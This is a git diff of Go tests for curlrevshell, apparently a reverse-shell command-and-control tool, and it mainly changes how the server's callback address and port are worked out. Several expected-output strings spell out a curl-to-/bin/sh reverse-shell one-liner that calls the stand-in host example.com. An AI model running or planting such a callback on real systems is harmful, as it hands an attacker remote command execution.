@@ -23,7 +23,6 @@ import (
 	"strings"
 	"sync"
 	"testing"
-	"text/template"
 
 	"github.com/magisterquis/curlrevshell/internal/iobroker"
 	"github.com/magisterquis/curlrevshell/lib/chanlog"
@@ -32,11 +31,92 @@ import (
 	"github.com/magisterquis/curlrevshell/lib/opshell"
 )
 
+// localAddrContext returns a context which sets http.LocalAddrContextKey to
+// s.Addr.
+func localAddrContext(s *Server) context.Context {
+	return context.WithValue(
+		context.Background(),
+		http.LocalAddrContextKey,
+		s.l.Addr(),
+	)
+}
+
+// make sure we can get a context with the server's local address.
+func TestLocalAddrContext(t *testing.T) {
+	_, _, _, s, _ := newTestServer(t)
+	sa := s.l.Addr()
+	v := localAddrContext(s).Value(http.LocalAddrContextKey)
+	ca, ok := v.(net.Addr)
+	if nil == v {
+		t.Fatalf("Did not get local address")
+	} else if !ok {
+		t.Fatalf(
+			"Incorrect local address type\n got: %T\nwant: %T",
+			v,
+			ca,
+		)
+	}
+	if got, want := ca.Network(), sa.Network(); got != want {
+		t.Errorf(
+			"Incorrect network:\n got: %s\nwant: %s",
+			got,
+			want,
+		)
+	}
+	if got, want := ca.String(), sa.String(); got != want {
+		t.Errorf(
+			"Incorrect stringified addresses:\n got: %s\nwant: %s",
+			got,
+			want,
+		)
+	}
+	if ca != sa {
+		t.Errorf("Addresses unequal")
+	}
+}
+
+// lisenPort returns s's listener's port.
+func listenPort(t *testing.T, s *Server) string {
+	wp, err := crstemplate.Port(s.l.Addr().String())
+	if nil != err {
+		t.Fatalf("Error getting server port: %s", err)
+	}
+	if "" == wp {
+		t.Fatalf("Server's listener's address had no port")
+	}
+	return wp
+}
+
+func TestListenPort(t *testing.T) {
+	_, _, _, s, _ := newTestServer(t)
+	a := s.l.Addr().String()
+	_, want, err := net.SplitHostPort(a)
+	if nil != err {
+		t.Fatalf("Error splitting %s into host and port: %s", a, err)
+	}
+	if "" == want {
+		t.Fatalf("Listener address had no port")
+	}
+
+	if got := listenPort(t, s); got != want {
+		t.Fatalf(
+			"listenPort returned wrong port:\n got: %s\nwant: %s",
+			got,
+			want,
+		)
+	}
+}
+
 func TestServerScriptHandler(t *testing.T) {
 	cl, _, och, s, _ := newTestServer(t)
 	rr := httptest.NewRecorder()
 	rr.Body = new(bytes.Buffer)
-	s.scriptHandler(rr, httptest.NewRequest(http.MethodGet, "/c", nil))
+	s.scriptHandler(rr, httptest.NewRequestWithContext(
+		localAddrContext(s),
+		http.MethodGet,
+		"/c",
+		nil,
+	))
 	if http.StatusOK != rr.Code {
 		t.Errorf("Non-OK Code %d", rr.Code)
 	}
@@ -52,7 +132,7 @@ func TestServerScriptHandler(t *testing.T) {
 	wantLog := opshell.CLine{
 		Color: ScriptColor,
 		Line: "[192.0.2.1] Sent script: ID:IDID " +
-			"Host:example.com Path:/c",
+			"C2Addr:example.com:" + listenPort(t, s) + " Path:/c",
 	}
 	if gotLog != wantLog {
 		t.Errorf(
@@ -63,11 +143,14 @@ func TestServerScriptHandler(t *testing.T) {
 	}
 
 	/* Make sure the template came out ok, too. */
-	wantBody := `#!/bin/sh
-curl -sk --pinnedpubkey sha256//xxx= https://example.com/i/IDID -N  </dev/null 2>&0 |
+	wantBody := fmt.Sprintf(
+		`#!/bin/sh
+curl -sk --pinnedpubkey sha256//xxx= https://example.com:%s/i/IDID -N  </dev/null 2>&0 |
 /bin/sh 2>&1 |
-curl -sk --pinnedpubkey sha256//xxx= https://example.com/o/IDID -T- >/dev/null 2>&1
-`
+curl -sk --pinnedpubkey sha256//xxx= https://example.com:%[1]s/o/IDID -T- >/dev/null 2>&1
+`,
+		listenPort(t, s),
+	)
 	gotBody := rr.Body.String()
 	gotBody = strings.ReplaceAll(gotBody, id, "IDID") /* Remove ID */
 	gotBody = regexp.MustCompile(                     /* Remove hash */
@@ -95,12 +178,12 @@ func TestServerScriptHandler_Path(t *testing.T) {
 		s.tmplf,
 		[]byte(`
 {{ define "script" -}}
-{{- if eq "/c/one" .Path -}}
+{{- if eq "/c/one" .Request.URL.Path -}}
 	one
-{{- else if eq "/c/two" .Path -}}
+{{- else if eq "/c/two" .Request.URL.Path -}}
 	two
 {{- else -}}
-	{{.Path}}
+	{{.Request.URL.Path}}
 {{- end -}}
 {{ end }}
 `),
@@ -143,7 +226,8 @@ func TestServerScriptHandler_Path(t *testing.T) {
 			rr.Body = new(bytes.Buffer)
 			s.scriptHandler(
 				rr,
-				httptest.NewRequest(
+				httptest.NewRequestWithContext(
+					localAddrContext(s),
 					http.MethodGet,
 					c.have,
 					nil,
@@ -172,8 +256,6 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 	cl, _, _, s, _ := newTestServer(t)
 	fn := filepath.Join(t.TempDir(), "kittens.tmpl")
 	s.tmplf = fn
-	defTxt := "default template"
-	s.defTmpl = template.Must(template.New("").Parse(defTxt))
 
 	var want string
 	const wantDefault = "WANT_DEFAULT"
@@ -184,11 +266,17 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 	checkDefaultCallbackScript is used. */
 	f := func(t *testing.T, expResCode int) {
 		t.Helper()
+		/* Write the template to a file. */
 		rr := httptest.NewRecorder()
 		rr.Body = new(bytes.Buffer)
 		s.scriptHandler(
 			rr,
-			httptest.NewRequest(http.MethodGet, "/c", nil),
+			httptest.NewRequestWithContext(
+				localAddrContext(s),
+				http.MethodGet,
+				"/c",
+				nil,
+			),
 		)
 		if expResCode != rr.Code {
 			t.Errorf(
@@ -198,7 +286,7 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 			)
 		}
 		if got := rr.Body.String(); wantDefault == want {
-			checkDefaultCallbackScript(t, got)
+			checkDefaultCallbackScript(t, s, got)
 		} else if got != want {
 			t.Errorf(
 				"Incorrect body:\n got: %s\nwant: %s",
@@ -216,14 +304,14 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 			fn,
 			[]byte(
 				`{{define "script"}}`+
-					`templatey kittens: {{.Host}}`+
+					`templatey kittens: {{.C2Addr}}`+
 					`{{end}}`,
 			),
 			0660,
 		); nil != err {
 			t.Fatalf("Error writing template to %s: %s", fn, err)
 		}
-		want = "templatey kittens: example.com"
+		want = "templatey kittens: example.com:" + listenPort(t, s)
 		f(t, http.StatusOK)
 	})
 
@@ -233,15 +321,15 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 			fn,
 			[]byte(
 				`{{define "critter_name"}}moose{{end}}
-				{{define "script"}}templatey `+
-					`{{template "critter_name" .}}: `+
-					`{{.Host}}{{end}}`,
+				{{define "script"}}templatey critter: `+
+					`{{template "critter_name" .}} `+
+					`{{.C2Addr | host}}{{end}}`,
 			),
 			0660,
 		); nil != err {
 			t.Fatalf("Error writing template to %s: %s", fn, err)
 		}
-		want = "templatey moose: example.com"
+		want = "templatey critter: moose example.com"
 		f(t, http.StatusOK)
 	})
 
@@ -249,12 +337,16 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 	t.Run("changed_file", func(t *testing.T) {
 		if err := os.WriteFile(
 			fn,
-			[]byte(`{{define "script"}}moose: {{.Host}}{{end}}`),
+			[]byte(
+				`{{define "script"}}`+
+					`moose: {{.Request.Method}}`+
+					`{{end}}`,
+			),
 			0660,
 		); nil != err {
 			t.Fatalf("Error writing template to %s: %s", fn, err)
 		}
-		want = "moose: example.com"
+		want = "moose: GET"
 		f(t, http.StatusOK)
 	})
 
@@ -276,8 +368,8 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 		if err := os.Remove(fn); nil != err {
 			t.Fatalf("Error removing %s: %s", fn, err)
 		}
-		want = wantDefault
-		f(t, http.StatusOK)
+		want = ""
+		f(t, http.StatusInternalServerError)
 	})
 
 	/* Test a file which has a non subtemplate-template. */
@@ -308,97 +400,6 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 
 }
 
-func TestC2URL(t *testing.T) {
-	cl, _, _, s, _ := newTestServer(t)
-	/* Work out our listen port, for testing. */
-	_, serverPort, err := net.SplitHostPort(s.l.Addr().String())
-	if nil != err {
-		t.Fatalf("Error getting server's listen port: %s", err)
-	}
-	if HTTPSPort == serverPort {
-		t.Fatalf(
-			"Test server listening on port %s, this breaks tests",
-			HTTPSPort,
-		)
-	}
-	for _, c := range []struct {
-		have *http.Request
-		want string
-	}{{
-		have: httptest.NewRequest(
-			http.MethodGet,
-			"https://kittens.com/simple_URL",
-			nil,
-		),
-		want: "kittens.com",
-	}, {
-		have: httptest.NewRequest(
-			http.MethodGet,
-			"http://kittens.com/as_param?"+
-				C2Param+
-				"=moose.com",
-			nil,
-		),
-		want: "moose.com",
-	}, {
-		have: func() *http.Request {
-			req := httptest.NewRequest(
-				http.MethodGet,
-				"http://kittens.com/as_header",
-				nil,
-			)
-			req.Header.Set(
-				C2Param,
-				"moose.com",
-			)
-			return req
-		}(),
-		want: "moose.com",
-	}, {
-		have: func() *http.Request {
-			req := httptest.NewRequest(
-				http.MethodGet,
-				"https://kittens.com/from_SNI",
-				nil,
-			)
-			req.Host = ""
-			return req
-		}(),
-		want: net.JoinHostPort("kittens.com", serverPort),
-	}, {
-		have: func() *http.Request {
-			req := httptest.NewRequest(
-				http.MethodGet,
-				"https://kittens.com/as_header",
-				nil,
-			)
-			req.Header.Set(
-				C2Param,
-				"moose.com",
-			)
-			return req
-		}(),
-		want: "moose.com",
-	}} {
-		t.Run(c.have.URL.String(), func(t *testing.T) {
-			got, err := s.c2URL(c.have)
-			if nil != err {
-				t.Fatalf("Error: %s", err)
-			}
-			if got != c.want {
-				t.Fatalf(
-					"URL incorrect:\n"+
-						" got: %s\n"+
-						"want: %s",
-					got,
-					c.want,
-				)
-			}
-		})
-	}
-	cl.ExpectEmpty(t)
-}
-
 // Make sure we can set the script URL in the output.
 func TestServer_SetScriptURLPath(t *testing.T) {
 	var (
@@ -409,7 +410,6 @@ func TestServer_SetScriptURLPath(t *testing.T) {
 		sl,
 		"127.0.0.1:0",
 		"",
-		"",
 		nil,
 		nil,
 		nil,
@@ -417,11 +417,10 @@ func TestServer_SetScriptURLPath(t *testing.T) {
 		nil,
 		false,
 		true,
-		crstemplate.URLPaths{
-			In:     "up_In",
-			InOut:  "up_InOut",
-			Out:    "up_Out",
-			Script: want,
+		crstemplate.Params{
+			URLPaths: crstemplate.URLPaths{
+				Script: want,
+			},
 		},
 	)
 	if nil != err {
@@ -486,7 +485,6 @@ func TestServer_IncorrectSubtemplates(t *testing.T) {
 	s, err := New(
 		slog.New(slog.NewJSONHandler(io.Discard, nil)),
 		"127.0.0.1:0",
-		"",
 		tmplf,
 		ich,
 		och,
@@ -495,7 +493,7 @@ func TestServer_IncorrectSubtemplates(t *testing.T) {
 		nil,
 		false,
 		true,
-		DefaultURLPaths,
+		crstemplate.Params{},
 	)
 	if nil != err {
 		t.Fatalf("Error starting server: %s", err)
@@ -526,9 +524,8 @@ func TestServer_IncorrectSubtemplates(t *testing.T) {
 		Color: opshell.ColorRed,
 		Line: fmt.Sprintf(
 			"Error generating callback one-liners: "+
-				"generating line for %s: adding custom "+
-				"templates: template data outside of "+
-				"subtemplates",
+				"executing callback subtemplate for %s: "+
+				"adding custom templates: no subtemplates",
 			s.l.Addr(),
 		),
 	}, {
@@ -541,22 +538,23 @@ func TestServer_IncorrectSubtemplates(t *testing.T) {
 
 // checkDefaultCallbackScript checks to see if got looks like the default
 // callback script.  The ID and publickey will be replaced  with dummy values.
-func checkDefaultCallbackScript(t *testing.T, got string) {
-	t.Helper()
+// s is used to get the listen port.
+func checkDefaultCallbackScript(t *testing.T, s *Server, got string) {
 	/* Make sure the template came out ok, too. */
-	want := `#!/bin/sh
-curl -sk --pinnedpubkey sha256//xxx= https://example.com/i/zzz -N  </dev/null 2>&0 |
+	wantF := `#!/bin/sh
+curl -sk --pinnedpubkey sha256//xxx= https://example.com:%s/i/zzz -N  </dev/null 2>&0 |
 /bin/sh 2>&1 |
-curl -sk --pinnedpubkey sha256//xxx= https://example.com/o/zzz -T- >/dev/null 2>&1
+curl -sk --pinnedpubkey sha256//xxx= https://example.com:%[1]s/o/zzz -T- >/dev/null 2>&1
 `
+	want := fmt.Sprintf(wantF, listenPort(t, s))
 
 	/* Replace unreliable bits with dummy values. */
 	got = regexp.MustCompile( /* Remove hash. */
 		`sha256//[0-9A-z+/]{43}=`,
 	).ReplaceAllString(got, `sha256//xxx=`)
 	got = regexp.MustCompile( /* Remove random ID. */
-		`https://example.com/(i|o)/\S+`,
-	).ReplaceAllString(got, `https://example.com/$1/zzz`)
+		`https://example.com:(\d+)/(i|o)/\S+`,
+	).ReplaceAllString(got, `https://example.com:$1/$2/zzz`)
 
 	/* See if it looks right. */
 	if want != got {
@@ -571,7 +569,11 @@ curl -sk --pinnedpubkey sha256//xxx= https://example.com/o/zzz -T- >/dev/null 2>
 }
 
 // lAddrLines wraps s.lAddrLines, terminating the test on error.
-func lAddrLines(t *testing.T, s *Server, st string) []string {
+func lAddrLines(
+	t *testing.T,
+	s *Server,
+	st crstemplate.SubtemplateName,
+) []string {
 	ls, err := s.lAddrLines(st)
 	if nil != err {
 		t.Fatalf("Error generating callback lines: %s", err)
